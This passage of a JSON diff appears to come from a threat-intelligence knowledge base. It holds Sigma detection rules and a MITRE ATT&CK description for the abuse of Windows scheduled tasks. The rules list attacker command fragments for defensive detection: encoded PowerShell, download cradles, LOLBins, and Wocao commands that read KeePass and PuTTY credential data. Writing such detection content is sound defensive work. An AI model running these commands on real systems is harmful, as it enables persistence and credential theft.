+                            "raw": "author: '@Kostastsale, @TheDFIRReport, slightly modified by pH-T (Nextron Systems)'\ndate: 2022/02/12\ndescription: Detects the creation of a schtask that executes a base64 encoded payload\n  stored in the Windows Registry using PowerShell.\ndetection:\n  condition: all of selection*\n  selection1:\n    CommandLine|contains|all:\n    - /Create\n    - /SC\n    - FromBase64String\n    - Get-ItemProperty\n    Image|endswith: \\schtasks.exe\n  selection2:\n    CommandLine|contains:\n    - 'HKCU:'\n    - 'HKLM:'\n    - 'registry::'\n    - HKEY_\nfalsepositives:\n- Unknown\nid: c4eeeeae-89f4-43a7-8b48-8d1bdfa66c78\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/03/15\nreferences:\n- https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\nstatus: test\ntags:\n- attack.execution\n- attack.persistence\n- attack.t1053.005\n- attack.t1059.001\ntitle: Scheduled Task Executing Powershell Encoded Payload from Registry\n",
+                            "sigma:id": "c4eeeeae-89f4-43a7-8b48-8d1bdfa66c78",
+                            "title": "Scheduled Task Executing Powershell Encoded Payload from Registry",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "761270e6-3a97-4c18-9a44-a844cb5b562b",
+                        "lookup_data": {
+                            "description": "Chiseling In: Lorenz Ransomware Group Cracks MiVoice And Calls Back For Free",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/761270e6-3a97-4c18-9a44-a844cb5b562b.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1666603345",
+                            "uuid": "761270e6-3a97-4c18-9a44-a844cb5b562b",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "8a8379b8-780b-4dbf-b1e9-31c8d112fefb",
+                        "lookup_data": {
+                            "description": "Detects scheduled task creations that have suspicious action command and folder combinations",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/04/15\ndescription: Detects scheduled task creations that have suspicious action command\n  and folder combinations\ndetection:\n  condition: all of selection_*\n  selection_all_folders:\n    CommandLine|contains:\n    - C:\\ProgramData\\\n    - '%ProgramData%'\n  selection_command:\n    CommandLine|contains:\n    - powershell\n    - pwsh\n    - 'cmd /c '\n    - 'cmd /k '\n    - 'cmd /r '\n    - 'cmd.exe /c '\n    - 'cmd.exe /k '\n    - 'cmd.exe /r '\n  selection_create:\n    CommandLine|contains: ' /create '\n  selection_img:\n  - Image|endswith: \\schtasks.exe\n  - OriginalFileName: schtasks.exe\nfalsepositives:\n- Unknown\nid: 8a8379b8-780b-4dbf-b1e9-31c8d112fefb\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/18\nreferences:\n- https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/lazarus-dream-job-chemical\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1053.005\ntitle: Schtasks From Suspicious Folders\n",
+                            "sigma:id": "8a8379b8-780b-4dbf-b1e9-31c8d112fefb",
+                            "title": "Schtasks From Suspicious Folders",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f548a603-c9f2-4c89-b511-b089f7e94549",
+                        "lookup_data": {
+                            "description": "Detects manual execution of the \"Microsoft Compatibility Appraiser\" task via schtasks. In order to trigger persistence stored in the \"\\AppCompatFlags\\TelemetryController\" registry key.",
+                            "raw": "author: Sreeman\ndate: 2020/09/29\ndescription: Detects manual execution of the \"Microsoft Compatibility Appraiser\" task\n  via schtasks. In order to trigger persistence stored in the \"\\AppCompatFlags\\TelemetryController\"\n  registry key.\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains|all:\n    - 'run '\n    - \\Application Experience\\Microsoft Compatibility Appraiser\n  selection_img:\n  - Image|endswith: \\schtasks.exe\n  - OriginalFileName: schtasks.exe\nfalsepositives:\n- Unknown\nid: f548a603-c9f2-4c89-b511-b089f7e94549\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/19\nreferences:\n- https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/\nrelated:\n- id: 73a883d0-0348-4be4-a8d8-51031c2564f8\n  type: derived\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1053.005\ntitle: Potential Persistence Execution Via Microsoft Compatibility Appraiser\n",
+                            "sigma:id": "f548a603-c9f2-4c89-b511-b089f7e94549",
+                            "title": "Potential Persistence Execution Via Microsoft Compatibility Appraiser",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "3a734d25-df5c-4b99-8034-af1ddb5883a4",
+                        "lookup_data": {
+                            "description": "Detects suspicious scheduled task creation events. Based on attributes such as paths, commands line flags, etc.",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/12/05\ndescription: Detects suspicious scheduled task creation events. Based on attributes\n  such as paths, commands line flags, etc.\ndetection:\n  condition: all of selection_*\n  selection_commands:\n    TaskContent|contains:\n    - regsvr32\n    - rundll32\n    - cmd.exe</Command>\n    - cmd</Command>\n    - '<Arguments>/c '\n    - '<Arguments>/k '\n    - '<Arguments>/r '\n    - powershell\n    - pwsh\n    - mshta\n    - wscript\n    - cscript\n    - certutil\n    - bitsadmin\n    - bash.exe\n    - 'bash '\n    - scrcons\n    - 'wmic '\n    - wmic.exe\n    - forfiles\n    - scriptrunner\n    - hh.exe\n  selection_eid:\n    EventID: 4698\n  selection_paths:\n    TaskContent|contains:\n    - \\AppData\\Local\\Temp\\\n    - \\AppData\\Roaming\\\n    - \\Users\\Public\\\n    - \\WINDOWS\\Temp\\\n    - C:\\Temp\\\n    - \\Desktop\\\n    - \\Downloads\\\n    - \\Temporary Internet\n    - C:\\ProgramData\\\n    - C:\\Perflogs\\\nfalsepositives:\n- Unknown\nid: 3a734d25-df5c-4b99-8034-af1ddb5883a4\nlevel: high\nlogsource:\n  definition: The Advanced Audit Policy setting Object Access > Audit Other Object\n    Access Events has to be configured to allow this detection. We also recommend\n    extracting the Command field from the embedded XML in the event data.\n  product: windows\n  service: security\nmodified: 2022/12/07\nreferences:\n- https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4698\nstatus: experimental\ntags:\n- attack.execution\n- attack.privilege_escalation\n- attack.persistence\n- attack.t1053.005\ntitle: Suspicious Scheduled Task Creation\n",
+                            "sigma:id": "3a734d25-df5c-4b99-8034-af1ddb5883a4",
+                            "title": "Suspicious Scheduled Task Creation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1053.005",
+                            "mitre-cti:description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",
+                            "mitre-cti:name": "Scheduled Task",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Andrew Northern, @ex_raritas', 'Bryan Campbell, @bry_campbell', 'Zachary Abzug, @ZackDoesML', 'Selena Larson, @selenalarson', 'Sittikorn Sangrattanapitak'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9', 'created': '2019-11-27T14:58:00.429Z', 'x_mitre_version': '1.2', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1053.005', 'url': 'https://attack.mitre.org/techniques/T1053/005'}, {'source_name': 'SigmaHQ', 'url': 'https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_delete/registry_delete_removal_sd_value_scheduled_task_hide.yml', 'description': 'BlackB0lt. (2022, April 15). https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_delete/registry_delete_removal_sd_value_scheduled_task_hide.yml. Retrieved June 1, 2022.'}, {'source_name': 'ProofPoint Serpent', 'url': 'https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain', 'description': 'Campbell, B. et al. (2022, March 21). Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain. Retrieved April 11, 2022.'}, {'source_name': 'Defending Against Scheduled Task Attacks in Windows Environments', 'url': 'https://blog.qualys.com/vulnerabilities-threat-research/2022/06/20/defending-against-scheduled-task-attacks-in-windows-environments', 'description': 'Harshal Tupsamudre. (2022, June 20). Defending Against Scheduled Tasks. Retrieved July 5, 2022.'}, {'source_name': 'Twitter Leoloobeek Scheduled Task', 'url': 'https://twitter.com/leoloobeek/status/939248813465853953', 'description': 'Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017.'}, {'source_name': 'Tarrask scheduled task', 'url': 'https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/', 'description': 'Microsoft Threat Intelligence Team & Detection and Response Team . (2022, April 12). Tarrask malware uses scheduled tasks for defense evasion. Retrieved June 1, 2022.'}, {'source_name': 'Microsoft Scheduled Task Events Win10', 'url': 'https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events', 'description': 'Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019.'}, {'source_name': 'TechNet Scheduled Task Events', 'url': 'https://technet.microsoft.com/library/dd315590.aspx', 'description': 'Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.'}, {'source_name': 'TechNet Autoruns', 'url': 'https://technet.microsoft.com/en-us/sysinternals/bb963902', 'description': 'Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.'}, {'source_name': 'TechNet Forum Scheduled Task Operational Setting', 'url': 'https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen', 'description': 'Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\\n\\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\\n\\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\\n\\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ', 'modified': '2022-07-06T20:20:13.871Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'Scheduled Task', 'x_mitre_detection': 'Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\\\System32\\\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\\n\\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\\n\\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\\n\\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\\n\\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}], 'x_mitre_is_subtechnique': True, 'x_mitre_data_sources': ['Scheduled Job: Scheduled Job Creation', 'Windows Registry: Windows Registry Key Creation', 'Command: Command Execution', 'Process: Process Creation', 'File: File Modification'], 'x_mitre_permissions_required': ['Administrator'], 'x_mitre_remote_support': True, 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "9e2e51c5-c699-4794-ba5a-29f5da40ac0c",
+                        "lookup_data": {
+                            "description": "Detects commands used by Turla group as reported by ESET in May 2020",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/05/26\ndescription: Detects commands used by Turla group as reported by ESET in May 2020\ndetection:\n  condition: 1 of selection*\n  selection1:\n    CommandLine|contains:\n    - tracert -h 10 yahoo.com\n    - .WSqmCons))|iex;\n    - Fr`omBa`se6`4Str`ing\n  selection2:\n    CommandLine|contains|all:\n    - net use https://docs.live.net\n    - '@aol.co.uk'\nfalsepositives:\n- Unknown\nid: 9e2e51c5-c699-4794-ba5a-29f5da40ac0c\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\nstatus: test\ntags:\n- attack.g0010\n- attack.execution\n- attack.t1059.001\n- attack.t1053.005\n- attack.t1027\ntitle: Turla Group Commands May 2020\n",
+                            "sigma:id": "9e2e51c5-c699-4794-ba5a-29f5da40ac0c",
+                            "title": "Turla Group Commands May 2020",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c0580559-a6bd-4ef6-b9b7-83703d98b561",
+                        "lookup_data": {
+                            "description": "Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018",
+                            "raw": "author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2018/03/23\ndescription: Detects Chafer activity attributed to OilRig as reported in Nyotron report\n  in March 2018\ndetection:\n  condition: selection_service\n  selection_service:\n    EventID: 4698\n    TaskName:\n    - SC Scheduled Scan\n    - UpdatMachine\nfalsepositives:\n- Unknown\nid: c0580559-a6bd-4ef6-b9b7-83703d98b561\nlevel: critical\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/11/27\nreferences:\n- https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/\nrelated:\n- id: 53ba33fd-3a50-4468-a5ef-c583635cfa92\n  type: derived\nstatus: test\ntags:\n- attack.persistence\n- attack.g0049\n- attack.t1053.005\n- attack.s0111\n- attack.t1543.003\n- attack.defense_evasion\n- attack.t1112\n- attack.command_and_control\n- attack.t1071.004\ntitle: Chafer Activity - Security\n",
+                            "sigma:id": "c0580559-a6bd-4ef6-b9b7-83703d98b561",
+                            "title": "Chafer Activity - Security",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "ff3af8b5-2d14-40ec-9dd2-14e100011e51",
+                        "lookup_data": {
+                            "description": "APT34 targets Jordan Government using new Saitama backdoor",
+                            "link": "http://www.botvrij.eu/data/feed-osint/ff3af8b5-2d14-40ec-9dd2-14e100011e51.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1652457184",
+                            "uuid": "ff3af8b5-2d14-40ec-9dd2-14e100011e51",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f2c64357-b1d2-41b7-849f-34d2682c0fad",
+                        "lookup_data": {
+                            "description": "Detects suspicious scheduled task creations with commands that are uncommon",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/02/23\ndescription: Detects suspicious scheduled task creations with commands that are uncommon\ndetection:\n  condition: selection_schtasks and ( all of selection_pattern* or selection_rare\n    or selection_anomaly )\n  selection_anomaly:\n  - CommandLine|contains|all:\n    - /xml C:\\Users\\\n    - \\AppData\\Local\\\n  - CommandLine|contains|all:\n    - wscript.exe\n    - \\AppData\\\n  selection_pattern1:\n    CommandLine|contains:\n    - '/sc minute '\n    - '/ru system '\n  selection_pattern2:\n    CommandLine|contains:\n    - 'cmd.exe /c '\n    - cmd /c\n    - 'cmd.exe /k '\n    - cmd /k\n    - 'cmd.exe /r '\n    - cmd /r\n  selection_rare:\n    CommandLine|contains:\n    - ' bypass '\n    - .DownloadString\n    - .DownloadFile\n    - FromBase64String\n    - ' -w hidden '\n    - ' IEX'\n    - ' -enc '\n    - ' -decode '\n    - '/c start /min '\n    - ' curl '\n  selection_schtasks:\n    CommandLine|contains: '/Create '\n    Image|endswith: \\schtasks.exe\nfalsepositives:\n- Software installers that run from temporary folders and also install scheduled tasks\nid: f2c64357-b1d2-41b7-849f-34d2682c0fad\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/18\nreferences:\n- https://app.any.run/tasks/512c1352-6380-4436-b27d-bb62f0c020d6/\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1053.005\ntitle: Suspicious Add Scheduled Command Pattern\n",
+                            "sigma:id": "f2c64357-b1d2-41b7-849f-34d2682c0fad",
+                            "title": "Suspicious Add Scheduled Command Pattern",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "a8f29a7b-b137-4446-80a0-b804272f3da2",
+                        "lookup_data": {
+                            "description": "Detect lateral movement using GPO scheduled task, usually used to deploy ransomware at scale",
+                            "raw": "author: Samir Bousseaden\ndate: 2019/04/03\ndescription: Detect lateral movement using GPO scheduled task, usually used to deploy\n  ransomware at scale\ndetection:\n  condition: selection\n  selection:\n    Accesses|contains:\n    - WriteData\n    - '%%4417'\n    EventID: 5145\n    RelativeTargetName|endswith: ScheduledTasks.xml\n    ShareName: \\\\\\\\\\*\\\\SYSVOL\nfalsepositives:\n- If the source IP is not localhost then it's super suspicious, better to monitor\n  both local and remote changes to GPO scheduledtasks\nid: a8f29a7b-b137-4446-80a0-b804272f3da2\nlevel: high\nlogsource:\n  definition: The advanced audit policy setting \"Object Access > Audit Detailed File\n    Share\" must be configured for Success/Failure\n  product: windows\n  service: security\nmodified: 2021/11/27\nreferences:\n- https://twitter.com/menasec1/status/1106899890377052160\n- https://www.secureworks.com/blog/ransomware-as-a-distraction\nstatus: test\ntags:\n- attack.persistence\n- attack.lateral_movement\n- attack.t1053.005\ntitle: Persistence and Execution at Scale via GPO Scheduled Task\n",
+                            "sigma:id": "a8f29a7b-b137-4446-80a0-b804272f3da2",
+                            "title": "Persistence and Execution at Scale via GPO Scheduled Task",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "81325ce1-be01-4250-944f-b4789644556f",
+                        "lookup_data": {
+                            "description": "Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/02/21\ndescription: Detects Schtask creations that point to a suspicious folder or an environment\n  variable often used by malware\ndetection:\n  condition: ( all of selection1* or all of selection2* ) and not 1 of filter*\n  filter_mixed:\n  - CommandLine|contains:\n    - update_task.xml\n    - /Create /TN TVInstallRestore /TR\n  - ParentCommandLine|contains: unattended.ini\n  selection1_all_folders:\n    CommandLine|contains:\n    - '%AppData%'\n    - \\AppData\\Local\\\n    - \\AppData\\Roaming\\\n    - '%Public%'\n    - \\Users\\Public\n    - C:\\Windows\\Temp\n    - C:\\Perflogs\n  selection1_create:\n    CommandLine|contains: ' /create '\n    Image|endswith: \\schtasks.exe\n  selection2_parent:\n    ParentCommandLine|endswith: \\svchost.exe -k netsvcs -p -s Schedule\n  selection2_some_folders:\n    CommandLine|contains:\n    - '%Public%'\n    - \\Users\\Public\n    - C:\\Windows\\Temp\n    - C:\\Perflogs\nfalsepositives:\n- Benign scheduled tasks creations or executions that happen often during software\n  installations\n- Software that uses the AppData folder and scheduled tasks to update the software\n  in the AppData folders\nid: 81325ce1-be01-4250-944f-b4789644556f\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/18\nreferences:\n- https://www.welivesecurity.com/2022/01/18/donot-go-do-not-respawn/\n- https://www.joesandbox.com/analysis/514608/0/html#324415FF7D8324231381BAD48A052F85DF04\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1053.005\ntitle: Suspicious Schtasks From Env Var Folder\n",
+                            "sigma:id": "81325ce1-be01-4250-944f-b4789644556f",
+                            "title": "Suspicious Schtasks From Env Var Folder",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c5c00f49-b3f9-45a6-997e-cfdecc6e1967",
+                        "lookup_data": {
+                            "description": "Detects the creation of a schtask that executes a file from C:\\Users\\<USER>\\AppData\\Local",
+                            "raw": "author: pH-T (Nextron Systems), Nasreddine Bencherchali\ndate: 2022/03/15\ndescription: Detects the creation of a schtask that executes a file from C:\\Users\\<USER>\\AppData\\Local\ndetection:\n  condition: selection and not filter\n  filter:\n    CommandLine|contains: /TN TVInstallRestore\n    Image|endswith: \\schtasks.exe\n    ParentImage|contains|all:\n    - \\AppData\\Local\\Temp\\\n    - TeamViewer_.exe\n  selection:\n    CommandLine|contains:\n    - NT AUT\n    - ' SYSTEM '\n    CommandLine|contains|all:\n    - /Create\n    - /RU\n    - /TR\n    - C:\\Users\\\n    - \\AppData\\Local\\\n    Image|endswith: \\schtasks.exe\nfalsepositives:\n- Unknown\nid: c5c00f49-b3f9-45a6-997e-cfdecc6e1967\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/28\nreferences:\n- https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\nstatus: experimental\ntags:\n- attack.execution\n- attack.persistence\n- attack.t1053.005\n- attack.t1059.001\ntitle: Suspicious Schtasks Execution AppData Folder\n",
+                            "sigma:id": "c5c00f49-b3f9-45a6-997e-cfdecc6e1967",
+                            "title": "Suspicious Schtasks Execution AppData Folder",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1c0e41cd-21bb-4433-9acc-4a2cd6367b9b",
+                        "lookup_data": {
+                            "description": "Detects when an attacker tries to modify an already existing scheduled tasks to run from a suspicious location\nAttackers can create a simple looking task in order to avoid detection on creation as it's often the most focused on\nInstead they modify the task after creation to include their malicious payload\n",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/07/28\ndescription: 'Detects when an attacker tries to modify an already existing scheduled\n  tasks to run from a suspicious location\n\n  Attackers can create a simple looking task in order to avoid detection on creation\n  as it''s often the most focused on\n\n  Instead they modify the task after creation to include their malicious payload\n\n  '\ndetection:\n  condition: all of selection_*\n  selection_schtasks:\n    CommandLine|contains|all:\n    - ' /Change '\n    - ' /TN '\n    Image|endswith: \\schtasks.exe\n  selection_susp_images:\n    CommandLine|contains:\n    - regsvr32\n    - rundll32\n    - 'cmd /c '\n    - 'cmd /k '\n    - 'cmd /r '\n    - 'cmd.exe /c '\n    - 'cmd.exe /k '\n    - 'cmd.exe /r '\n    - powershell\n    - mshta\n    - wscript\n    - cscript\n    - certutil\n    - bitsadmin\n    - bash.exe\n    - 'bash '\n    - scrcons\n    - 'wmic '\n    - wmic.exe\n    - forfiles\n    - scriptrunner\n    - hh.exe\n    - 'hh '\n  selection_susp_locations:\n    CommandLine|contains:\n    - \\AppData\\Local\\Temp\n    - \\AppData\\Roaming\\\n    - \\Users\\Public\\\n    - \\WINDOWS\\Temp\\\n    - \\Desktop\\\n    - \\Downloads\\\n    - \\Temporary Internet\n    - C:\\ProgramData\\\n    - C:\\Perflogs\\\n    - '%ProgramData%'\n    - '%appdata%'\n    - '%comspec%'\n    - '%localappdata%'\nfalsepositives:\n- Unknown\nid: 1c0e41cd-21bb-4433-9acc-4a2cd6367b9b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/18\nreferences:\n- Internal Research\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1053.005\ntitle: Suspicious Modification Of Scheduled Tasks\n",
+                            "sigma:id": "1c0e41cd-21bb-4433-9acc-4a2cd6367b9b",
+                            "title": "Suspicious Modification Of Scheduled Tasks",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1cfac73c-be78-4f9a-9b08-5bde0c3953ab",
+                        "lookup_data": {
+                            "description": "Detects activity mentioned in Operation Wocao report",
+                            "raw": "author: Florian Roth (Nextron Systems), frack113\ndate: 2019/12/20\ndescription: Detects activity mentioned in Operation Wocao report\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - checkadmin.exe 127.0.0.1 -all\n    - netsh advfirewall firewall add rule name=powershell dir=in\n    - cmd /c powershell.exe -ep bypass -file c:\\s.ps1\n    - /tn win32times /f\n    - create win32times binPath=\n    - \\c$\\windows\\system32\\devmgr.dll\n    - ' -exec bypass -enc JgAg'\n    - type *keepass\\KeePass.config.xml\n    - iie.exe iie.txt\n    - reg query HKEY_CURRENT_USER\\Software\\\\*\\PuTTY\\Sessions\\\nfalsepositives:\n- Administrators that use checkadmin.exe tool to enumerate local administrators\nid: 1cfac73c-be78-4f9a-9b08-5bde0c3953ab\nlevel: high\nlogsource:\n  category: process_creation\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/\n- https://twitter.com/SBousseaden/status/1207671369963646976\nrelated:\n- id: 74ad4314-482e-4c3e-b237-3f7ed3b9ca8d\n  type: derived\nstatus: test\ntags:\n- attack.discovery\n- attack.t1012\n- attack.defense_evasion\n- attack.t1036.004\n- attack.t1027\n- attack.execution\n- attack.t1053.005\n- attack.t1059.001\ntitle: Operation Wocao Activity\n",
+                            "sigma:id": "1cfac73c-be78-4f9a-9b08-5bde0c3953ab",
+                            "title": "Operation Wocao Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "24c8392b-aa3c-46b7-a545-43f71657fe98",
+                        "lookup_data": {
+                            "description": "Detects scheduled task creations or modification on a suspicious schedule type",
